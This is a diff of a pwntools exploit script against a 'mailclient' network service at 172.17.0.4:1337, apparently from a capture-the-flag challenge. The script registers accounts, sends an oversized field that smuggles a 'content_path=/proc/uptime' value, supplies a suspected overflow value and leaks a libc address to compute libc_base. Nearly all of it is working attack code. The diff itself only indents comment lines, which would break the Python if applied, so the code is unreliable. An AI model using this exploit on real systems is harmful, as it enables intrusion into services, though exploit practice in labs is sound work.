@@ -9,23 +9,23 @@ from pwn import *
 import random
 
 p = remote('172.17.0.4', 1337)
-#p = process('mailclient')
+    #p = process('mailclient')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 email = b'xguest' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'
 email2 = b'xguest2' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'
 
-#register
+    #register
 p.sendline(b'2'); time.sleep(0.15)
 p.sendline(email); time.sleep(0.15)
 p.sendline(b'guest'); time.sleep(0.15)
 
-#register
+    #register
 p.sendline(b'2'); time.sleep(0.15)
 p.sendline(email2); time.sleep(0.15)
 p.sendline(b'guest'); time.sleep(0.15)
 
-#login
+    #login
 p.sendline(b'1'); time.sleep(0.15)
 p.sendline(email); time.sleep(0.15)
 p.sendline(b'guest'); time.sleep(0.155)
@@ -33,7 +33,7 @@ p.sendline(b'guest'); time.sleep(0.155)
 filename1 = b'fisadioada' + str(random.randint(10**10,10**11)).encode()
 filename2 = b'asdj09casj' + str(random.randint(10**10,10**11)).encode()
 
-#sent
+    #sent
 p.sendline(b'3'); time.sleep(0.155)
 p.sendline(email); time.sleep(0.155)
 p.sendline(filename1); time.sleep(0.155)
@@ -42,14 +42,14 @@ p.sendline(b'xxxxxxxxxxxx'+b'aaaa;content_path=/proc/uptime\x00'*70); time.sleep
 
 p.sendline(b'4')
 
-#sent
+    #sent
 p.sendline(b'3'); time.sleep(0.155)
 p.sendline(email2); time.sleep(0.15)
 p.send(b'\n'); time.sleep(0.155)
 p.sendline(b'2'); time.sleep(0.155) #2147483648
 p.sendline(b'a'*1); time.sleep(0.155)
 
-#login
+    #login
 p.sendline(b'1'); time.sleep(0.15)
 p.sendline(email2); time.sleep(0.15)
 p.sendline(b'guest'); time.sleep(0.155)
@@ -66,7 +66,7 @@ p.recvn(8*7)
 libc_base = u64(p.recvn(8)) - 0x29d90
 print(f'libc_base : {(hex(libc_base))}')
 
-#sent
+    #sent
 p.sendline(b'3'); time.sleep(0.15)
 p.sendline(email2); time.sleep(0.15)
 p.sendline(filename2); time.sleep(0.15)
